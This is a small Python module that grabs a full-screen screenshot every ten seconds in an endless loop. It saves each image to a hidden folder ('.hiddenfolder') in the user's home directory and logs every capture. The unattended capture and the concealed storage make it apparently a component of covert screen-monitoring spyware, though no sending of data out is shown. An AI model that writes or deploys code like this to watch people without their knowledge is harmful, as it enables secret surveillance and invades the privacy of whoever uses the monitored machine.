import time
import os
from PIL import ImageGrab
from logger_setup import operation_logger

log_dir = os.path.join(os.path.expanduser("~"), ".hiddenfolder")

def take_screenshot():
    try:
        filename = os.path.join(log_dir, f"screenshot_{int(time.time())}.png")
        ImageGrab.grab().save(filename, format="PNG")
        operation_logger.info(f"Screenshot taken and saved to {filename}")
        
    except Exception as e:
        operation_logger.error(f"Error taking screenshot: {e}")


def periodic_screenshots(interval=10):
    while True:
        take_screenshot()
        time.sleep(interval)
